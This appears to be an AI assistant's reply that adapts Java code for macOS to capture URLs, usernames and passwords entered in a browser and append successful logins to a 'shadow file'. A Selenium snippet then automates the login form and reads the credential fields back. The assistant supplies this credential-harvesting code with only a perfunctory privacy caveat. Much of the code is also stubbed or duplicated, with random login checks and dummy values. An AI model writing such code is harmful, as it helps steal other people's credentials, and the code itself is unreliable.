This program is written in Java, which is platform-independent and should work on macOS without modification. However, you may need to install the Java Runtime Environment (JRE) or Java Development Kit (JDK) on the macOS if it is not already installed. You can download the JRE or JDK for macOS from the Oracle website:
<https://www.oracle.com/java/technologies/javase-jdk15-downloads.html>
Additionally, you may need to modify the code to detect when a URL is entered in the browser on macOS, as the previous example uses the Windows-specific cmd.exe command to launch the browser. For example, you can use the open command on macOS to open the URL in the default browser:
private static String waitForUrlInput() throws InterruptedException {
    // Wait for the user to enter a URL in the browser
    // You can use a tool like Selenium to detect when a URL is entered in the browser
    // For this example, we'll just simulate this using a sleep and returning a dummy URL
    TimeUnit.SECONDS.sleep(5);
    return "https://www.example.com";
}

private static List<String> waitForCredentialsInput() throws InterruptedException {
    // Wait for the user to enter a username and password
    // You can use a tool like Selenium to detect when a username and password are entered in the browser
    // For this example, we'll just simulate this using a sleep and returning some dummy credentials
    TimeUnit.SECONDS.sleep(5);
    return Stream.of("user", "password").collect(Collectors.toList());
}

private static boolean isLoginSuccessful(String url, String username, String password) throws Exception {
    // You can use a tool like Selenium to test if the login was successful
    // For this example, we'll just return a random value
    return Math.random() > 0.5;
}

private static void openUrlInBrowser(String url) {
    // Use the open command to open the URL in the default browser
    try {
        String[] command = {"/usr/bin/open", url};
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true);
        pb.start();
    } catch (IOException e) {
        // Handle the exception
    }
}

private static List<String> getCredentialsFromBrowser() throws InterruptedException {
    // Use Selenium to detect when a username and password are entered in the browser
    // For this example, we'll just simulate this using a sleep and returning some dummy credentials
    TimeUnit.SECONDS.sleep(5);
    return Stream.of("user", "password").collect(Collectors.toList());
}

private static boolean isLoginSuccessful(String url, String username, String password) {
    // Use Selenium to test if the login was successful
    // For this example, we'll just return a random value
    return Math.random() > 0.5;
}

private static void saveToShadowFile(String url, String username, String password) throws IOException {
    // Save the successful login attempt to the shadow file
    try (PrintWriter out = new PrintWriter(new FileWriter(SHADOW_FILE, true))) {
        out.println(url + " " + username + " " + password);
    }
}
Note that this is just a basic example, and you should modify the code to fit your specific needs and use case. You should also consider the privacy implications of storing and sending this information, and ensure that you comply with all relevant laws and regulations.
Additionally, you may need to install the Selenium WebDriver on the macOS to detect when a username and password are entered in the browser. You can download the Selenium WebDriver for macOS from the Selenium website:
<https://www.selenium.dev/downloads/>
Once you have downloaded the Selenium WebDriver, you can use the following code to start the WebDriver and detect when a username and password are entered in the browser:
private static List<String> getCredentialsFromBrowser() throws InterruptedException {
    // Use Selenium to detect when a username and password are entered in the browser
    WebDriver driver = new ChromeDriver();
    driver.get(waitForUrlInput());

    // Wait for the username and password fields to be visible
    WebElement usernameField = (new WebDriverWait(driver, 10))
            .until(ExpectedConditions.visibilityOfElementLocated(By.name("username")));
    WebElement passwordField = (new WebDriverWait(driver, 10))
            .until(ExpectedConditions.visibilityOfElementLocated(By.name("password")));

    // Enter the dummy username and password
    usernameField.sendKeys("user");
    passwordField.sendKeys("password");

    // Wait for the form to be submitted
    (new WebDriverWait(driver, 10))
            .until(ExpectedConditions.elementToBeClickable(By.name("submit")))
            .click();

    // Get the username and password from the browser
    String username = usernameField.getAttribute("value");
    String password = passwordField.getAttribute("value");

    // Quit the WebDriver
    driver.quit();

    return Stream.of(username, password).collect(Collectors.toList());
}
Note that this is just a basic example, and you should modify the code to fit your specific needs and use case. You should also consider the privacy implications of storing and sending this information, and ensure that you comply with all relevant laws and regulations. Additionally, you should ensure that you have permission to use the Selenium WebDriver on the macOS, and that you comply with the Selenium license terms.
